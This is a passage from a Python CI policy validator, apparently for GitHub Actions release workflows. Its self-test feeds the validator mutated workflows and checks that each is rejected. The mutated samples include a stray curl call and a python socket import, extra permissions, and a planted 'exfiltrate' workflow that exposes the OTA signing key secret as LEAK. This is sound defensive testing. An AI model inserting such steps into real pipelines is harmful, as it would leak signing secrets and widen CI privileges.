        ("trusted-pr-ref", "pr-policy.yml", "github.event.pull_request.base.sha",
         "github.event.pull_request.head.sha", "trusted base SHA"),
        ("job-timeout", "pr-policy.yml", "    timeout-minutes: 5\n", "", "timeout-minutes"),
        ("bench-default-ref", "bench-acceptance.yml",
         "    if: github.ref == format('refs/heads/{0}', github.event.repository.default_branch)\n", "",
         "non-default-branch"),
        ("bench-id-token", "bench-acceptance.yml",
         "    permissions:\n      contents: read\n    env:\n",
         "    permissions:\n      contents: read\n      id-token: write\n    env:\n",
         "permissions must match the exact reviewed inventory"),
        ("bench-environment", "bench-acceptance.yml",
         "    permissions:\n      contents: read\n    env:\n",
         "    permissions:\n      contents: read\n    environment: firmware-signing\n    env:\n",
         "protected Environment inventory drift"),
        ("bench-third-action", "bench-acceptance.yml",
         "      - name: Materialize inert report input\n",
         "      - name: Unexpected third-party action\n"
         "        uses: example/action@0123456789abcdef0123456789abcdef01234567\n"
         "      - name: Materialize inert report input\n",
         "action inventory drift"),
        ("bench-python-socket", "bench-acceptance.yml", "          umask 077\n",
         "          umask 077\n          python3 -c 'import socket'\n",
         "run blocks must match"),
        ("bench-extra-run-step", "bench-acceptance.yml",
         "      - name: Materialize inert report input\n",
         "      - name: Extra run\n        run: true\n"
         "      - name: Materialize inert report input\n",
         "step inventory must be exact"),
        ("bench-extra-job", "bench-acceptance.yml", "jobs:\n",
         "jobs:\n  contact-device:\n    runs-on: ubuntu-latest\n    timeout-minutes: 1\n    steps:\n      - run: true\n",
         "job inventory drift"),
        ("bench-local-producer", "bench-acceptance.yml", "      report-json:\n",
         "      report-body:\n", "report-json dispatch input"),
        ("bench-artifact-hash", "bench-acceptance.yml",
         '--expect-artifact-sha256 "$EXPECTED_ARTIFACT_SHA256"',
         '--expect-artifact-sha256 "$EXPECTED_SHA"', "run blocks must match"),
        ("bench-target-bind", "bench-acceptance.yml",
         '--expect-target "$EXPECTED_TARGET"', '--expect-target "esp32s3"',
         "run blocks must match"),
        ("bench-upload-name", "bench-acceptance.yml",
         "name: bench-acceptance-report-${{ github.run_id }}-${{ inputs.expected-source-sha }}",
         "name: bench-acceptance-report", "run ID, source SHA"),
        ("bench-upload-path", "bench-acceptance.yml",
         "path: ${{ runner.temp }}/bench-acceptance/report.json",
         "path: _bench-input/report.json", "exact validated path"),
        ("bench-upload-digest", "bench-acceptance.yml",
         "ARTIFACT_DIGEST: ${{ steps.upload-report.outputs.artifact-digest }}",
         "ARTIFACT_DIGEST: missing", "artifact ID/digest"),
        ("bench-report-digest", "bench-acceptance.yml",
         "REPORT_SHA256: ${{ steps.validate-report.outputs.report-sha256 }}",
         "REPORT_SHA256: missing", "artifact ID/digest"),
        ("bench-post-validation-mutation", "bench-acceptance.yml",
         "          printf 'report-sha256=%s\\n' \"$report_sha256\" >> \"$GITHUB_OUTPUT\"\n",
         "          printf 'report-sha256=%s\\n' \"$report_sha256\" >> \"$GITHUB_OUTPUT\"\n"
         "          cp scripts/check-bench-acceptance.py \"$REPORT_PATH\"\n",
         "run blocks must match"),
        ("bench-download-consumer", "bench-acceptance.yml",
         "uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02",
         "uses: actions/download-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02",
         "action inventory drift"),
        ("bench-hardware-network", "bench-acceptance.yml", "          umask 077\n",
         "          umask 077\n          curl https://device.invalid/status\n",
         "run blocks must match"),
    ]
    for name, filename, old, new, expected in mutations:
        with tempfile.TemporaryDirectory(prefix=f"workflow-policy-{name}-") as directory:
            fixture = Path(directory)
            shutil.copytree(root / ".github/workflows", fixture / ".github/workflows")
            replace_once(fixture / ".github/workflows" / filename, old, new)
            try:
                validate(fixture)
            except PolicyError as exc:
                require(expected in str(exc),
                        f"self-test {name} failed for the wrong reason: {exc}")
            else:
                raise PolicyError(f"self-test accepted mutation: {name}")

    # Move the real local Pages assembly/bind block after the real Actions artifact upload.  This
    # is an order mutation, not a deleted-token canary: all stages remain present and only their
    # external-publication ordering must make the policy red.
    with tempfile.TemporaryDirectory(prefix="workflow-policy-pages-after-upload-") as directory:
        fixture = Path(directory)
        shutil.copytree(root / ".github/workflows", fixture / ".github/workflows")
        workflow = fixture / ".github/workflows/build.yml"
        text = workflow.read_text(encoding="utf-8")
        pages_start = text.index(
            "      - name: Assemble local Pages candidate before any publication\n"
        )
        pages_end = text.index(
            "      - name: Revalidate current Release candidate immediately before signed artifact upload\n",
            pages_start,
        )
        pages_block = text[pages_start:pages_end]
        text = text[:pages_start] + text[pages_end:]
        late_at = text.index(
            "      - name: Revalidate current Release candidate immediately before Release mutation\n"
        )
        workflow.write_text(text[:late_at] + pages_block + text[late_at:], encoding="utf-8")
        try:
            validate(fixture)
        except PolicyError as exc:
            require(
                "must precede signed upload and draft creation" in str(exc),
                f"self-test Pages-after-upload failed for the wrong reason: {exc}",
            )
        else:
            raise PolicyError("self-test accepted local Pages bind after signed upload")

    with tempfile.TemporaryDirectory(prefix="workflow-policy-extra-workflow-") as directory:
        fixture = Path(directory)
        shutil.copytree(root / ".github/workflows", fixture / ".github/workflows")
        (fixture / ".github/workflows/exfiltrate.yml").write_text(
            "name: exfiltrate\non: push\npermissions:\n  contents: write\njobs:\n"
            "  exfiltrate:\n    runs-on: ubuntu-latest\n    timeout-minutes: 1\n"
            "    permissions:\n      contents: write\n    environment: firmware-signing\n"
            "    steps:\n      - run: true\n        env:\n"
            "          LEAK: ${{ secrets.OTA_SIGNING_KEY }}\n",
            encoding="utf-8",
        )
        try:
            validate(fixture)
        except PolicyError as exc:
            require(
                "workflow file inventory drift" in str(exc),
                f"extra-workflow self-test failed for the wrong reason: {exc}",
            )
        else:
            raise PolicyError("self-test accepted an unreviewed workflow")

    # Model the final two-command draft-publication edge.  The static validator above requires
    # this exact adjacency in the real job; here a selector exit representing an advanced main
    # must stop the shell before the fake PATCH client can leave a marker.
    with tempfile.TemporaryDirectory(prefix="workflow-policy-patch-toctou-") as directory:
        fixture = Path(directory)
        (fixture / "scripts").mkdir()
        fakebin = fixture / "fakebin"
        fakebin.mkdir()
        marker = fixture / "patch-reached"
        selector = fixture / "scripts" / "select-release-version.sh"
        selector.write_text("#!/usr/bin/env bash\nexit 23\n", encoding="utf-8")
        gh = fakebin / "gh"
        gh.write_text(
            "#!/usr/bin/env bash\nprintf reached > \"$PATCH_MARKER\"\n",
            encoding="utf-8",
        )
        selector.chmod(0o755)
        gh.chmod(0o755)
        environment = os.environ.copy()
        environment.update(
            {
                "PATH": f"{fakebin}:{environment.get('PATH', '')}",
                "PATCH_MARKER": str(marker),
                "SOURCE_SHA": "0" * 40,
                "DISPLAY_VERSION": "1.2.3",
                "GITHUB_REPOSITORY": "owner/repo",
                "release_id": "1",
            }
        )
        result = subprocess.run(
            [
                "bash",
                "-c",
                "set -euo pipefail\n"
                "./scripts/select-release-version.sh --require-release-candidate "
                '"$SOURCE_SHA" "$DISPLAY_VERSION"\n'
                'gh api --method PATCH "repos/$GITHUB_REPOSITORY/releases/$release_id"',
            ],
            cwd=fixture,
            env=environment,
            check=False,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        require(result.returncode == 23, "TOCTOU selector failure was not propagated")
        require(not marker.exists(), "draft PATCH was reached after current main advanced")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--root", type=Path, default=Path(__file__).resolve().parent.parent)
    parser.add_argument("--self-test", action="store_true")
    args = parser.parse_args()
    try:
        validate(args.root.resolve())
        if args.self_test:
            self_test(args.root.resolve())
    except (OSError, UnicodeError, PolicyError) as exc:
        print(f"workflow-policy: {exc}", file=sys.stderr)
        return 1
    print(f"workflow-policy: PASS ({len(workflow_files(args.root.resolve()))} workflows"
          + (", mutation canaries" if args.self_test else "") + ")")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
